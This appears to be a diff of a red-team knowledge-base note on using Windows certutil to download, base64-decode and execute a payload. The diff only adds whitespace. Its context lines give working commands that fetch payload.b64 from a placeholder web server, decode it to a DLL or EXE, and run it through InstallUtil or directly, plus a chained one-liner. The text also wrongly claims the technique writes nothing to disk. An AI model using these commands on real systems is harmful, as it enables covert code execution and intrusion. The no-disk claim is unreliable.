@@ -38,9 +38,13 @@ To execute a payload using Certutil, the attacker first downloads the payload to
 
 This technique allows an attacker to execute code on a target system without writing any files to disk, making it difficult for security tools to detect the attack.
 
+ 
+
 ## Requirements
 
 1. Access to the command prompt
+
+ 
 
 ## Defense
 
@@ -50,20 +54,32 @@ This technique allows an attacker to execute code on a target system without wri
 
 1. Monitor for any unusual network traffic, especially traffic to known malicious domains.
 
+ 
+
 ## Objectives
 
 1. Download and execute a payload on a target system
+
+ 
 
 # Instructions
 
 1. This command downloads a payload from a web server and executes it on the target system. The command uses certutil to download the payload and decode it from base64 format. The decoded payload is then saved to a DLL file and executed using InstallUtil.
 
+ 
+
+
+
 **Code**: [[certutil -urlcache -split -f http://webserver/payl]]
+
+
 
 > The command consists of three parts:
 1. certutil -urlcache -split -f http://webserver/payload.b64 payload.b64: This command downloads the payload from the specified URL and saves it to a file named payload.b64.
 2. certutil -decode payload.b64 payload.dll: This command decodes the payload from base64 format and saves it to a DLL file named payload.dll.
 3. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll: This command executes the payload by using InstallUtil, which is a Windows utility used to install and uninstall .NET assemblies.
+
+
 
 **Command** ([[Download payload.b64 from webserver]]):
 
@@ -71,11 +87,19 @@ This technique allows an attacker to execute code on a target system without wri
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 ```
 
+
+
+
+
 **Command** ([[Decode payload.b64 to payload.dll]]):
 
 ```bash
 certutil -decode payload.b64 payload.dll
 ```
+
+
+
+
 
 **Command** ([[Install payload.dll as a service]]):
 
@@ -83,9 +107,17 @@ certutil -decode payload.b64 payload.dll
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
 
+
+
 2. This command downloads a payload from a remote server and executes it on the local machine. The payload is first downloaded in base64 format and then decoded and saved as an executable file before being executed.
 
+ 
+
+
+
 **Code**: [[certutil -urlcache -split -f http://webserver/payl]]
+
+
 
 > The 'certutil' command is used to download the payload from the specified URL and save it as a base64 encoded file named 'payload.b64'. The '-urlcache' option is used to download the file and '-split' option is used to split the file into multiple chunks for faster download. The '-f' option is used to overwrite an existing file with the same name.
 
@@ -93,11 +125,15 @@ The downloaded file is then decoded using the 'certutil' command with the '-deco
 
 Finally, the decoded payload is executed using the command 'payload.exe'.
 
+
+
 **Command** ([[Download and decode payload from web server]]):
 
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -124,3 +160,5 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 
 - [[Certutil]]
 - [[Windows - Download and execute methods]]
+
+
